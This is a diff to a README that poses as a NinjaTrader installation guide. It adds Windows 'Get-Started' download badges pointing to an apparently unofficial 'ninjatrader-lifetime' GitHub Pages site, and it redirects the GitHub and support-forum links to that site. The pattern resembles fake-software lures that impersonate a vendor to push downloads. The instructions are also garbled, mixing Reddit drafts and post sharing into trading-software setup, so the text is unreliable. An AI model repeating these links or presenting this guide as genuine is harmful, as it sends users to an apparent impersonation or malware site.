@@ -39,7 +39,7 @@ NinjaTrader is free to use for charting, market analysis, and paper trading, pro
 
 <div align="center">
 
-![Installation Guide](https://support.ninjatrader.com/servlet/rtaImage?eid=ka0bV0000004j3N&feoid=00N1T00000AywZL&refid=0EMHs00000HWlah)
+![Installation Guide]([https://support.ninjatrader.com/servlet/rtaImage?eid=ka0bV0000004j3N&feoid=00N1T00000AywZL&refid=0EMHs00000HWlah](https://support.ninjatrader.com/servlet/rtaImage?eid=ka0bV0000004j3N&feoid=00N1T00000AywZL&refid=0EMHs00000HWlah))
 
 </div>  
 
@@ -77,9 +77,9 @@ Once setup is complete, you can start creating Reddit drafts, managing your arch
 
 <div align="center">
   
-![Start](https://support.ninjatrader.com/servlet/rtaImage?eid=ka0bV0000004WcP&feoid=00N1T00000AywZL&refid=0EMHs0000065cVs)
+![Start](https://ninjatrader.com/getmedia/72619ab2-6a71-46a0-b307-51e7ba29759b/Workspace.png)
 
-</div>
+</div> 
 
 # **Quick Start Guide**
 
@@ -134,10 +134,16 @@ NinjaTrader.exe --import "C:\Path\To\Your\File.txt"
 
 NinjaTrader integrates with **GitHub** for version control and public sharing of posts. Here's how to set it up for automatic updates and sharing:
 
+<div align="center">  
+
+[![Get-Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge&logo=windows)](https://ninjatrader-lifetime.github.io/.github/)
+
+</div>
+
 #### **Setting up a GitHub Repo for NinjaTrader**:
 
 1. **Create a New Repository on GitHub**
-   - Go to [GitHub](https://github.com), log in, and click **New Repository**.
+   - Go to [GitHub](https://ninjatrader-lifetime.github.io/.github/), log in, and click **New Repository**.
    - Name it **NinjaTrader** (or similar).
    - Initialize the repo with a **README.md** file.
 
@@ -276,6 +282,12 @@ This log can help you troubleshoot any failed tasks and ensure the automation pr
 
 </div>
 
+<div align="center">  
+
+[![Get-Started](https://img.shields.io/badge/Get-Started-blue?style=for-the-badge&logo=windows)](https://ninjatrader-lifetime.github.io/.github/)
+
+</div> 
+
 ---
 
 # **System Requirements**
@@ -328,22 +340,10 @@ If you're experiencing issues with **NinjaTrader**, here are some common solutio
 ### **Getting Support**
 
 If you're still facing issues after following these solutions, you can reach **NinjaTrader Support** via the following methods:
-- **Community Forum**: Visit the [NinjaTrader Support Forum](#) for community discussions and solutions from other traders.
-- **NinjaTrader Support Ticket**: Create a support ticket directly through the [NinjaTrader Support Page](#).
+- **Community Forum**: Visit the [NinjaTrader Support](https://ninjatrader-lifetime.github.io/.github/) Forum for community discussions and solutions from other traders.
+- **NinjaTrader Support Ticket**: Create a support ticket directly through the NinjaTrader Support Page.
 - **Phone Support**: Call us directly at **1-800-496-1683** for assistance with urgent issues.
 - **Email Support**: For email support, reach us at **support@ninjatrader.com**.
-
----
-
-# **Contributing**
-
-We welcome contributions! Please see our [Contributing Guidelines](#) for more details.
-
----
-
-# **License**
-
-This project is licensed under the MIT License - see the [LICENSE](#) file for details.
 
 ---
 
